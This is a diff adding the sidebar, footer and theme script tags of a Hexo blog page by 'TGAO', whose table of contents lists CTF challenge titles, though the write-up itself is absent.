+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            本站概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/uploads/avatar.jpg" alt="TGAO">
+            
+              <p class="site-author-name" itemprop="name">TGAO</p>
+              <p class="site-description motion-element" itemprop="description">To Go All Out</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">文章</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友链
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://laworigin.github.io/" title="WisdomTree" target="_blank">WisdomTree</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cryscat.com" title="Crycat" target="_blank">Crycat</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.lc4t.me/#blog" title="lc4t" target="_blank">lc4t</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://magicbluech.github.io/" title="MagicBlue" target="_blank">MagicBlue</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://otakekumi.github.io/" title="梅子酒" target="_blank">梅子酒</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://0clickjacking0.github.io" title="如果人生可以Ctrl+Z" target="_blank">如果人生可以Ctrl+Z</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#love-math"><span class="nav-text">love_math</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#justsoso"><span class="nav-text">justsoso</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#解法二"><span class="nav-text">解法二</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解法三"><span class="nav-text">解法三</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">TGAO</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+  <script type="text/javascript" color="0,0,240" opacity="0.7" zindex="-2" count="40" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+</body>
+</html>
